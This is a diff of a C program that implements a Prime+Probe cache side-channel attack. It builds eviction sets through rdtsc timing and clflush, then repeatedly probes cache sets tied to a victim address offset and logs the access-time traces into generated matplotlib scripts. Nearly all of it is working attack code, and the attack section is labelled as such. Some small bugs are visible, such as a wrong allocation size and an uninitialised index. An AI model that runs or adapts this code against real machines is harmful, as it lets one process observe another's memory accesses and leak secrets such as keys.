@@ -9,13 +9,15 @@
 #define WAY 20
 #define N 8*WAY*2
 #define SIZE SET*N
-#define THR 100
-#define T 180
+#define THR 110
+#define T 200
 #define CONF -1
 #define EVIC -2
+#define INIT -100
+#define ATTACK 600
 #define FLAG 0xfffffffe0000
 #define L 96
-#define R 5
+#define R 3
 
 #define RDTSC(X) asm volatile("rdtsc; shlq $32, %%rdx; orq %%rdx, %%rax":"=r"(X) :: "%rdx")
 
@@ -37,45 +39,37 @@ struct st{
 	struct st *e_next;
 	struct st *e_prev;
 };
-struct box{
-	uintptr_t num;
-	int counter;
+
+struct evi{
 	int head;
+	uintptr_t addr;
 };
+
 
 void loop();
 void shuffle(int *array, int set, int n);
 void insert(struct st *set, struct st *candidate);
 void e_insert(struct st *set, struct st *candidate);
 void myremove(struct st *candidate);
-void conv(uintptr_t num);
 int probe(struct st *set, struct st *candidate);
 int probe2(struct st *set, struct st *candidate);
 
-int main(){
-	int i, j, k, l, n, set, lines[N], counter;
-	int box_num, box_flag, set_num;
-	uintptr_t evi_buf[L][R];
-	uintptr_t evi_real[L], evi_real_tmp[L];
-	struct st *buf;
-	struct box *mybox;
 
-	set_num = 0;
+int main(int argc, char **argv){
+	int i, j, k, l, n, set, counter;
+	int index, output_num, reader, hit;
+	int lines[N], array[ATTACK];
+	int test[L];
+	struct st *buf;
+	struct evi *evi_buf;
 	
-	//buf = (struct st*)malloc(sizeof(struct st)*SIZE);
 	buf = mmap(NULL, LENGTH, PROTECTION, FLAGS, -1, 0);
-	mybox = (struct box*)malloc(sizeof(struct box)*R);
+	evi_buf = (struct evi*)malloc(sizeof(struct st)*L);
+
 	unsigned long long time, t1, t2;
 
-	/*
-	printf("buf[0]      %p\n",&buf[0]);
-	printf("buf[1]      %p\n",&buf[1]);	
-	printf("buf[SIZE-1] %p\n",&buf[SIZE-1]);
-	*/
-	//printf("size %d\n",sizeof(struct st));
-
 	//loop start-----------------------------------------------------------
-	set = 10;
+	set = atoi(argv[1]);
 	for(;;){
 		for(i = 0; i < N; i++) lines[i] = i;
 		for(i = 0; i < SIZE; i++){
@@ -98,11 +92,20 @@ int main(){
 				//printf("%d ",n);
 				if(!probe(conflict, &buf[n*SET + set])){
 					buf[n*SET + set].count++;
+					insert(conflict, &buf[n*SET + set]);
 				}
-				insert(conflict, &buf[n*SET + set]);
 			}
-			//for(i = 0; i < 1000; i++);
+			for(i = 0; i < 1000; i++);
 			free(conflict);
+		}
+
+		for(i = 0; i < N; i++){
+			asm __volatile__(
+					"clflush 0(%0)\n"
+					:
+					:"c"(&buf[i*SET + set])
+					:
+					);
 		}
 
 		//conflict set----------------------------------------------------
@@ -125,8 +128,18 @@ int main(){
 				buf[n*SET + set].flag = 0;
 			}
 		}	
-
-		printf("conflict set %d\n",counter);
+		
+		fprintf(stderr,"conflict set %d\n",counter);
+		
+		for(i = 0; i < N; i++){
+			asm __volatile__(
+					"mfence\n"
+					"clflush 0(%0)\n"
+					:
+					:"c"(&buf[i*SET + set])
+					:
+					);
+		}
 
 		//eviction set----------------------------------------------------
 		int number = 0;
@@ -148,21 +161,17 @@ int main(){
 						p->next->prev = p->prev;
 						if(!probe2(conflict, &buf[n*SET + set])){
 							e_insert(eviction, p);
-							//number++;
 						}
 						p->next->prev = p;
-						p->prev->next = p;
+					p->prev->next = p;
 
 					}
 
-					//printf("eviction set\n");
 					number_check++;
 					for(p = eviction->e_next; p->num != EVIC; p = p->e_next){
-						//printf("%p\n",p);
 						uintptr_t pnum = (uintptr_t)p;
 						pnum &= FLAG;
-						evi_buf[number++][set_num] = pnum;
-						//printf("evi_buf[%d][%d] : 0x%lx\n", number-1, set_num, evi_buf[number-1][set_num]);
+						test[number++] = p->num;
 					}
 						
 					for(p = conflict->next; p->num != CONF; p = p->next){
@@ -171,168 +180,171 @@ int main(){
 							myremove(p);
 							p = tmp->prev;
 						}
+						
+						asm __volatile__(
+								"mfence\n"
+								"lfence\n"
+								"clflush 0(%0)\n"
+								:
+								:"c"(p)
+								:
+								);
 					}
 					free(eviction);
 				}
 			}
 		}
 		if(number_check != 8 || number != L){
-			set_num--;
+			break;
 		}
-		set_num++;
-		printf("%d : set_num %d\n",set,set_num);
-		if(set_num == R) break;
-	}
-	//loop end----------------------------------------------------------------
-	printf("set_num %d\n",set_num);
+		fprintf(stderr,"%d : number_check %d\n",set,number_check);
+	}//loop end----------------------------------------------------------------
 	
-	for(i = 0; i < L; i++){
-		box_num = 0;
-		for(j = 0; j < R; j++){
-			mybox[j].num = 0;
-			mybox[j].counter = 0;
-		}
-		mybox[1].num = evi_buf[i][1];
-		mybox[1].counter++;
-		box_num++;
-		
-		for(j = 1; j < R; j++){
-			for(k = 0; k < box_num; k++){
-				box_flag = 0;
-				if(evi_buf[i][j] == mybox[k].num){
-					box_flag = 1;
-					break;
-				}
-			}
-			if(box_flag){
-				mybox[k].counter++;
-			} else {
-				mybox[box_num].num = evi_buf[i][j];
-				mybox[box_num].counter++;
-				box_num++;
-			}
-		}
-		
-		box_flag = 0;
-		for(j = 0; j < box_num; j++){
-			if(mybox[j].counter >= R/2+1 && mybox[j].num != 0){
-				evi_real[i] = mybox[j].num;
-				box_flag = 1;
-				printf("%d ; %d\n",i ,mybox[j].counter);
-			}
-		}
-		if(!box_flag){
-			fprintf(stderr,"eviction set error.\n");
-			exit(1);
-		}
-	}
-
-	for(i = 0; i < L; i++){
-		if(i % 16 == 0) printf("\n");
-		printf("0x%lx\n",evi_real[i]);
-		evi_real_tmp[i] = evi_real[i];
-	}
-
-	//attack-------------------------------------------
-
 	fprintf(stderr,"ok\n");
-	sleep(5);
 
-	struct box evi_box[L];
-	for(i = 0; i < L; i++){
-		evi_box[i].num = evi_real[i];
-		evi_box[i].counter = i/12;
-		evi_box[i].head = 0;
-	}
-	
-	uintptr_t victim = 0x000000000780;
+	//get other sets' eviction set-------------------------------------------
+	//for(i = 0; i < N; i++){
+
+	int s;
+	uintptr_t addr,evi_seed[L];
+	uintptr_t victim = 0x000000000010;
 	uintptr_t viflag = 0x000000000fc0;
-	int th, addr_num;
-	uintptr_t addr;
-	int aa = 0;
-	int array[1000];
+	victim &= viflag;
+	
+	for(i = 0; i < L; i++){
+		evi_buf[i].head = INIT;
+		addr = (uintptr_t)&buf[test[i]];
+		evi_buf[i].addr = (FLAG & addr);
+	}
 
-	for(i = 0; i < SIZE; i++){
+	for(i = 0; i < 64; i++){
 		addr = (uintptr_t)&buf[i];
 		addr &= viflag;
 		if(addr == victim){
+			s = i;
+			break;
+		}
+	}
+	for(i = s; i < SIZE; i = i + 64){
+		for(j = 0; j < L; j++){
 			addr = (uintptr_t)&buf[i];
 			addr &= FLAG;
-			for(j = 0; j < L; j++){
-				if(evi_box[j].num == addr && !evi_box[j].head){
-					evi_box[j].head = i;
-					//printf("%d  0x%lx  %d\n",evi_box[j].counter, evi_box[j].num, evi_box[j].head);
-					aa++;
-				}
+			if(evi_buf[j].head == INIT && addr == evi_buf[j].addr){
+				evi_buf[j].head = i;
+				break;
 			}
 		}
-		if(aa == L) break;	
 	}
-
-	printf("\n");
+	/*
 	for(i = 0; i < L; i++){
-		//evi_box[i].num = evi_real[i];
-		printf("%d \t0x%lx %d\n",evi_box[i].counter, evi_box[i].num, evi_box[i].head);
+		printf("%d ,%p\n",evi_buf[i].head, &buf[evi_buf[i].head]);
 	}
-	printf("\n");
+	*/
 
+	printf("%d\n",buf[0 + evi_buf[(L/8)*0+l].head].num);	
+	printf("%d\n",buf[SET + evi_buf[(L/8)*8+l].head].num);	
+	//attack-------------------------------------------
+	while(1){
 
-	printf("0 %p\n",&buf[0]);
-	printf("SET  %p\n",&buf[SET-1]);
-	printf("SIZE %p\n",&buf[SIZE-1]);
-	
+		FILE *fp;
 
-	int w;
-	printf("Please press any key\n");
-	scanf("%d",&w);
-	for(i = 0; i < 8; i++){
-		printf("------------------%d---------------------\n",i);
-		for(j = 0; j < SET; j = j + 64){
-			th = 0;
-			for(k = 0; k < 1000; k++){
-				//printf("%p\n",&buf[j + evi_box[2*i].head]);
-				//printf("%p\n\n",&buf[j + evi_box[2*i + 1].head]);
-				//if(k % 20 == 0) printf("\n");
+		int w;
+		fprintf(stderr,"Please press any key\n");
+		scanf("%d",&w);
+		if(w == 0){
+			exit(0);
+		} else if(w == 13){
+			fp = fopen("pp13.py","w");
+		} else if(w == 14){
+			fp = fopen("pp14.py","w");
+		} else if(w == 15){
+			fp = fopen("pp15.py","w");
+		} else {
+			fp = fopen("pp.py","w");
+		}
+		if(fp == NULL){
+			fprintf(stderr,"file errror\n");
+			exit(1);
+		}
+
+		fprintf(fp,"import matplotlib.pyplot as plt\n");
+		output_num = 0;
+		index = 0;
+
+		for(i = 0; i < 8; i++){
+			//printf("------------------%d---------------------\n",i);
+			for(j = 0; j < SET; j = j + 64){
 				for(l = 0; l < (L/8); l++){
-					addr_num = buf[j + evi_box[(L/8)*i+l].head].num;
-					addr_num = buf[j + evi_box[(L/8)*i+l].head].num;
-					addr_num = buf[j + evi_box[(L/8)*i+l].head].num;
+					reader = buf[j + evi_buf[(L/8)*i+l].head].num;
 				}
-				loop();
-				asm("lfence");
-				RDTSC(t1);
-				for(l = 0; l < (L/8); l++){
-					addr_num = buf[j + evi_box[(L/8)*i+l].head].num;
+				for(k = 0; k < ATTACK; k++){
+					loop();
+					asm("lfence");
+					RDTSC(t1);
+					for(l = 0; l < (L/8); l++){
+						reader = buf[j + evi_buf[(L/8)*i+l].head].num;
+					}
+					asm("lfence");
+					RDTSC(t2);
+					time = t2 - t1;
+					array[k] = time;
 				}
-				asm("lfence");
-				RDTSC(t2);
-				time = t2 - t1;
-				//printf("%3llu ",time);
-				if(time > T){
-					th++;
-					array[k] = 1;
-				} else {
-					array[k] = 0;
+
+				hit = 0;
+				for(k = 0; k < ATTACK; k++){
+					//printf("%d ",array[k]);
+					if(array[k] > T) hit++;
 				}
-			}
-			if(th > 100){
-				for(k = 0; k < 1000; k++){
-					if(k % 50 == 0) printf("\n");
-					printf("%d ",array[k]);
+
+				fprintf(fp,"#%d,%d",i,j);
+				for(k = 0; k < ATTACK; k++){
+					fprintf(fp,"%d ",array[k]);
 				}
-				printf("\n");
+				fprintf(fp,"\n");
+
+				if(hit > 30 && hit < 200){
+					fprintf(fp,"y%d = [",output_num);
+					for(k = 0; k < hit; k++){
+						if(k == hit-1){
+							fprintf(fp,"%d]\n",index);
+						} else {
+							fprintf(fp,"%d,",index);
+						}
+					}
+
+					int flag = 0;
+					fprintf(fp,"x%d = [",output_num);
+					for(k = 0; k < ATTACK; k++){
+						if(array[k] > T){
+							if(flag) fprintf(fp,",");
+							fprintf(fp,"%d",k);
+							flag++;
+						}
+					}
+					fprintf(fp,"]\n");
+
+					output_num++;
+				}
+				index++;
 			}
 		}
+		fprintf(stderr,"output_num %d\n",output_num);
+
+		for(i = 0; i < output_num; i++){
+			fprintf(fp,"plt.scatter(x%d, y%d, c = 'b')\n", i, i);
+		}
+
+		fprintf(fp,"plt.xlim([0,%d])\nplt.ylim([0,255])\nplt.show()\n",ATTACK);
+		fclose(fp);
 	}
-	//printf("th %d\n",th);
-	
-	printf("\nend\n");
+
+	fprintf(stderr,"\nend\n");
 	return 0;
 }
 
 void loop(){
 	int i;
-	for(i = 0; i < 300000; i++);
+	for(i = 0; i < 250000; i++);
 }
 
 void shuffle(int *array, int set, int n){
@@ -368,29 +380,6 @@ void myremove(struct st *candidate){
 	candidate->next = candidate->prev = candidate;
 }
 
-void conv(uintptr_t num){
-	int i, count;
-	int ary[N];
-	count = 0;
-
-	while(num){
-		if(num & 0x1 == 1){
-			ary[count++] = 1;
-		} else {
-			ary[count++] = 0;
-		}
-		num >>= 1;
-	}
-	for(i = count - 1; i >= 0; i--){
-		if(i == 5) printf("  ");
-		if(i == 16) printf("  ");
-		if(i == 19) printf("  ");
-		if(i == 26) printf("  ");
-		printf("%d",ary[i]);
-	}
-	printf("\n");
-}
-
 int probe(struct st *set, struct st *candidate){
 	int i, j, tmp, n;
 	unsigned long long time, t1, t2;
@@ -413,10 +402,11 @@ int probe(struct st *set, struct st *candidate){
 		asm("lfence");
 		RDTSC(t2);
 		time = t2 - t1;
-
+		//printf("%llu ",time);
 		if(time > THR) n++;
-		//for(j = 0; j < 500; j++);
+		for(j = 0; j < 1000; j++);
 	}
+	//printf("%d ",n);
 	return (n>=1);
 }
 
@@ -444,7 +434,7 @@ int probe2(struct st *set, struct st *candidate){
 		time = t2 - t1;
 
 		if(time > THR) n++;
-		//for(j = 0; j < 500; j++);
+		for(j = 0; j < 1000; j++);
 	}
 	//printf("%d ",n);
 	return (n>=2);
